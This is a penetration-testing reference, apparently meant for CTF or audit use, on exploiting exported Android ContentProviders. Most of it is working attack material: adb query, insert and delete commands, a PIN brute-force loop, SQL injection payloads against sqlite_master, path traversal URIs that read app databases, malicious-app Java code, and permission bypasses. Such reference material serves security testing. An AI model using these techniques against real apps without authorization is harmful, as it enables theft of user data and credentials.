# Content Provider Attacks Reference

Exported ContentProviders are one of the most common attack surfaces in Android apps. They expose structured data access (query/insert/update/delete) and file access (openFile) to other apps on the device.

## Decision Tree

```
Found exported ContentProvider?
├── Has android:permission attribute?
│   ├── signature level → Not exploitable from other apps
│   ├── dangerous level → Exploitable if user grants permission
│   └── normal level → Exploitable (auto-granted)
├── No permission (fully open)?
│   ├── What data does it expose?
│   │   ├── Secrets/credentials → Direct extraction
│   │   ├── User data → Privacy violation
│   │   └── File access → Path traversal candidate
│   ├── Does query() accept selection/selectionArgs?
│   │   └── SQL injection candidate
│   └── Does it implement openFile()?
│       └── Path traversal → arbitrary file read
└── Has readPermission but no writePermission (or vice versa)?
    └── Partial access — check what's unprotected
```

## Pattern 1: Exported Provider with No Permission (Direct Data Access)

### Signature in AndroidManifest.xml:
```xml
<!-- VULNERABLE — no permission, exported -->
<provider
    android:name=".SecretDataProvider"
    android:exported="true"
    android:authorities="com.example.app.provider"/>

<!-- ALSO VULNERABLE — exported=true overrides lack of permission -->
<provider
    android:name=".DataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.example.app.dataprovider"/>
```

### Exploitation via adb:
```bash
# Query all data
adb shell content query --uri content://com.example.app.provider

# Query with selection (WHERE clause)
adb shell content query --uri content://com.example.app.provider --where "pin=1234"

# Query specific columns
adb shell content query --uri content://com.example.app.provider --projection "secret:password"

# Insert data
adb shell content insert --uri content://com.example.app.provider \
  --bind name:s:attacker --bind value:s:injected

# Delete data
adb shell content delete --uri content://com.example.app.provider --where "id=1"

# Call (custom methods)
adb shell content call --uri content://com.example.app.provider --method getSecret --arg "1234"
```

### Exploitation via malicious app:
```java
// Any app on device can query the exported provider
Uri uri = Uri.parse("content://com.example.app.provider");
Cursor cursor = getContentResolver().query(uri, null, "pin=1234", null, null);
if (cursor != null && cursor.moveToFirst()) {
    String secret = cursor.getString(cursor.getColumnIndex("Secret"));
    Log.d("EXPLOIT", "Got secret: " + secret);
}
```

## Pattern 2: Provider with Weak PIN/Password Protection

### Signature in code:
```java
@Override
public Cursor query(Uri uri, String[] projection, String selection, ...) {
    // PIN extracted from selection parameter
    String pin = selection.replace("pin=", "");
    String decrypted = decrypt(pin);  // Small keyspace!
    if (decrypted != null) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"Secret"});
        cursor.addRow(new String[]{decrypted});
        return cursor;
    }
    return null;
}
```

### Exploitation:
```bash
# Brute-force 4-digit PIN via adb (slow but works)
for i in $(seq 0 9999); do
  pin=$(printf "%04d" $i)
  result=$(adb shell content query --uri content://com.example.app.provider --where "pin=$pin" 2>/dev/null)
  if echo "$result" | grep -q "Secret="; then
    echo "FOUND: PIN=$pin $result"
    break
  fi
done

# Better: extract crypto params from APK and crack offline (see crypto-key-cracking.md)
# 10,000 PINs × PBKDF2 = still < 5 seconds in Python
```

### Offline cracking approach (preferred):
1. Extract `assets/config.properties` or hardcoded crypto params from source
2. Identify algorithm (AES/CBC, AES/ECB, etc.) and key derivation (PBKDF2, raw, etc.)
3. Write Python script to brute-force the PIN space offline
4. See `crypto-key-cracking.md` for ready-made scripts

## Pattern 3: SQL Injection in ContentProvider

### Signature:
```java
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    // VULNERABLE — selection directly concatenated into SQL
    String sql = "SELECT * FROM secrets WHERE " + selection;
    return db.rawQuery(sql, null);
}
```

### Exploitation:
```bash
# Extract all rows (bypass WHERE clause)
adb shell content query --uri content://com.example.app.provider --where "1=1"

# UNION-based extraction
adb shell content query --uri content://com.example.app.provider \
  --where "1=1 UNION SELECT sql,2,3 FROM sqlite_master--"

# Extract table names
adb shell content query --uri content://com.example.app.provider \
  --where "1=1 UNION SELECT name,type,sql FROM sqlite_master WHERE type='table'--"
```

### Note on parameterized queries:
```java
// SAFE — uses selectionArgs (parameterized)
return db.query("secrets", projection, selection, selectionArgs, null, null, sortOrder);
// selection = "pin=?" and selectionArgs = ["1234"] → not injectable
```

## Pattern 4: Path Traversal via openFile()

### Signature:
```java
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    // VULNERABLE — uses last path segment without sanitization
    String filename = uri.getLastPathSegment();
    File file = new File(getContext().getFilesDir(), filename);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

### Exploitation:
```bash
# Read arbitrary files from app's data directory
adb shell content read --uri content://com.example.app.provider/..%2F..%2Fdatabases%2Fsecrets.db > secrets.db

# Or via code:
# Uri.parse("content://com.example.app.provider/../databases/secrets.db")
```

### Safer but still vulnerable patterns:
```java
// Checks for ".." but not URL-encoded variants
if (filename.contains("..")) return null;  // Bypass with %2e%2e or ..%2F
```

## Pattern 5: Provider Exposing File Access (openFile with arbitrary paths)

### Signature:
```java
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    // Takes full path from URI
    String path = uri.getPath();
    File file = new File(path);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

### Exploitation:
```bash
# Read any file the app can access
adb shell content read --uri "content://com.example.app.fileprovider/data/data/com.example.app/databases/app.db"
adb shell content read --uri "content://com.example.app.fileprovider/data/data/com.example.app/shared_prefs/secrets.xml"
```

## Pattern 6: Provider with call() Method

### Signature:
```java
@Override
public Bundle call(String method, String arg, Bundle extras) {
    if ("getSecret".equals(method)) {
        Bundle result = new Bundle();
        result.putString("secret", decryptSecret(arg));
        return result;
    }
    return null;
}
```

### Exploitation:
```bash
adb shell content call --uri content://com.example.app.provider --method getSecret --arg "1234"
```

## Discovery Checklist

### 1. Find all exported providers:
```bash
# From manifest
grep -A5 "<provider" AndroidManifest.xml | grep -E "exported|authorities|permission"

# From device (if app installed)
adb shell dumpsys package com.example.app | grep -A10 "ContentProvider"
```

### 2. Identify the authority URI:
```bash
# From manifest
grep "android:authorities" AndroidManifest.xml
# Result: content://com.example.app.provider

# Common patterns:
# content://com.example.app.provider
# content://com.example.app.provider/table_name
# content://com.example.app.provider/table_name/id
```

### 3. Determine available operations:
```bash
# Check which methods are implemented (from source)
grep -n "override.*fun\|@Override" SecretDataProvider.java | grep -i "query\|insert\|update\|delete\|openFile\|call"
```

### 4. Test access:
```bash
# Quick test — does it respond?
adb shell content query --uri content://com.example.app.provider 2>&1

# Common responses:
# "No result found." → works but no data matched
# "Unknown URI" → wrong path/authority
# "Permission Denial" → protected (need different approach)
# Actual data → jackpot
```

## Bypassing Protections

### Path-based permissions:
```xml
<!-- Provider with path-specific permissions -->
<provider android:authorities="com.example.provider"
    android:exported="true">
    <path-permission
        android:pathPrefix="/secret"
        android:readPermission="com.example.SECRET_READ"/>
</provider>
```
**Bypass:** Query paths NOT covered by path-permission (e.g., `/public`, `/`)

### Grant URI permissions:
```xml
<provider android:authorities="com.example.provider"
    android:exported="false"
    android:grantUriPermissions="true"/>
```
**Exploit:** If another exported component grants URI permission via intent flags:
```java
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.setData(Uri.parse("content://com.example.provider/secrets"));
```

### Temporary permissions via PendingIntent:
If the app creates PendingIntents with URI grants, intercept them.

## Android Version Considerations

| Android Version | Default Behavior |
|---|---|
| < 4.2 (API 16) | Providers exported by default if no `exported` attribute |
| 4.2+ (API 17) | Must explicitly set `exported="true"` |
| 12+ (API 31) | Must explicitly declare `exported` for all components with intent-filters |
| 14+ (API 34) | Dynamic receivers need RECEIVER_NOT_EXPORTED flag |

## Reporting

Document:
1. **Provider authority** (full content:// URI)
2. **What's exposed** (secrets, user data, files)
3. **Protection level** (none, weak PIN, SQL injectable)
4. **Exploitation method** (adb command or malicious app code)
5. **Data extracted** (actual secret/flag as proof)
6. **Impact** (what an attacker gains — credentials, PII, app takeover)
